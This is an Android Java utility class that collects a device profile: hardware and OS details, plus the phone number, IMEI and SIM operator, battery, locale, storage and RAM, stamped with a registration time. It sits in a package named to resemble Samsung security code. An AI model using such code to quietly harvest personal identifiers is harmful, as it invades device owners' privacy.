package com.samsung.android.security.v8.utils;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;

import androidx.core.app.ActivityCompat;

import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import java.util.TimeZone;

public class DeviceUtil {
    
    @SuppressLint("HardwareIds")
    public static String getDeviceId(Context context) {
        try {
            String androidId = Settings.Secure.getString(
                    context.getContentResolver(),
                    Settings.Secure.ANDROID_ID
            );
            
            if (androidId != null && !androidId.isEmpty()) {
                return androidId;
            }
        } catch (Exception e) {
            // Fallback
        }
        
        // Fallback to a generated ID
        return "DEVICE_" + Build.MANUFACTURER + "_" + Build.MODEL + "_" + System.currentTimeMillis();
    }
    
    @SuppressLint("HardwareIds")
    public static Map<String, Object> getDeviceInfo(Context context) {
        Map<String, Object> info = new HashMap<>();
        
        try {
            // معلومات الجهاز الأساسية
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("brand", Build.BRAND);
            info.put("model", Build.MODEL);
            info.put("device", Build.DEVICE);
            info.put("product", Build.PRODUCT);
            
            // معلومات النظام
            info.put("androidVersion", Build.VERSION.RELEASE);
            info.put("sdkVersion", Build.VERSION.SDK_INT);
            info.put("buildId", Build.ID);
            
            // معلومات الشبكة
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) 
                        == PackageManager.PERMISSION_GRANTED) {
                    
                    info.put("phoneNumber", tm.getLine1Number());
                    info.put("simOperator", tm.getSimOperatorName());
                    info.put("networkOperator", tm.getNetworkOperatorName());
                    info.put("imei", getImei(tm));
                    info.put("simCountry", tm.getSimCountryIso());
                }
            }
            
            // معلومات البطارية
            BatteryManager bm = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
            if (bm != null) {
                int batteryLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
                info.put("batteryLevel", batteryLevel);
            }
            
            // معلومات اللغة والمنطقة
            info.put("language", Locale.getDefault().getLanguage());
            info.put("country", Locale.getDefault().getCountry());
            info.put("timezone", TimeZone.getDefault().getID());
            
            // معلومات التخزين
            info.put("totalStorage", StorageUtil.getTotalStorage());
            info.put("freeStorage", StorageUtil.getFreeStorage());
            
            // معلومات الذاكرة
            info.put("totalRam", MemoryUtil.getTotalRam());
            info.put("availableRam", MemoryUtil.getAvailableRam(context));
            
            // وقت التسجيل
            info.put("registeredAt", System.currentTimeMillis());
            
        } catch (Exception e) {
            info.put("error", e.getMessage());
        }
        
        return info;
    }
    
    @SuppressLint("HardwareIds")
    private static String getImei(TelephonyManager tm) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                return tm.getImei();
            } else {
                return tm.getDeviceId();
            }
        } catch (Exception e) {
            return "N/A";
        }
    }
    
    public static String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        
        if (model.toLowerCase().startsWith(manufacturer.toLowerCase())) {
            return capitalize(model);
        } else {
            return capitalize(manufacturer) + " " + model;
        }
    }
    
    private static String capitalize(String s) {
        if (s == null || s.length() == 0) {
            return "";
        }
        char first = s.charAt(0);
        if (Character.isUpperCase(first)) {
            return s;
        } else {
            return Character.toUpperCase(first) + s.substring(1);
        }
    }
}
